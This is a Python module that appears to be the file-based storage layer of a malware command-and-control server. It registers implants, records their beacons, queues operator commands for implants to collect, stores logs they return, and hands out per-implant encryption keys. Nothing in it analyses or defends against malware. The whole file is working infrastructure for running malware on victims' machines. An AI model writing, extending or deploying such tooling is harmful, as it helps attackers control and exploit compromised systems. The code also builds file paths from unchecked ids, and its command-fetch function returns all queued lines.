import json
import os

def add_malware(malware_entry):

    directory = f"malware/{malware_entry['id']}"

    entry = json.dumps(malware_entry)
    

    os.makedirs("malware", exist_ok=True)

    os.makedirs(directory, exist_ok=True)

    with open(f"{directory}/about.txt", "w") as f:
        f.write(entry + "\n")

    for fname in ["logs.txt", "commands.txt"]:
        open(f"{directory}/{fname}", "a").close()


def update_becon(id, timestamp):

    malware_json = json.loads(read_file(id,"about.txt"))

    malware_json["last_beconed"] = timestamp

    data = json.dumps(malware_json)

    write_file(id, "about.txt", data)

def get_command(id):

    file_name = f"malware/{id}/commands.txt"

    with open(file_name, 'r') as fin:
        data = fin.read().splitlines(True)

    with open(file_name, 'w') as fout:
        fout.writelines(data[1:])

    return data

def post_command(json):
    id = json['id']
    cmd = json["command"]

    append_file(id,"commands.txt",cmd)
    

def add_log(json):

    id = json['id']
    log =  json['log']

    append_file(id,"logs.txt",log)


def read_file(id, file):

    file_name = f"malware/{id}/{file}"

    with open(file_name, "r") as f:
        return f.read()
    
def append_file(id, file, data):

    file_name = f"malware/{id}/{file}"

    with open(file_name, "a") as f:
        f.write(data+"\n")

def write_file(id, file, data):

    file_name = f"malware/{id}/{file}"

    with open(file_name, "w") as f:
        f.write(data)


def get_enc_key(id):

    malware_json = json.loads(read_file(id,"about.txt"))

    return int(malware_json['key'])

def get_all_malware():
    directory_path = "malware/"
    folders = os.listdir(directory_path)

    about_content = []

    for folder in folders:
        about_path = os.path.join(directory_path, folder, "about.txt")
        if os.path.exists(about_path):
            with open(about_path, "r") as file:
                content = file.read()
                about_content.append(content)
        else:
            print(f"No about.txt in {folder}")

    return about_content


def get_log(id):
    return read_file(id, "logs.txt")
    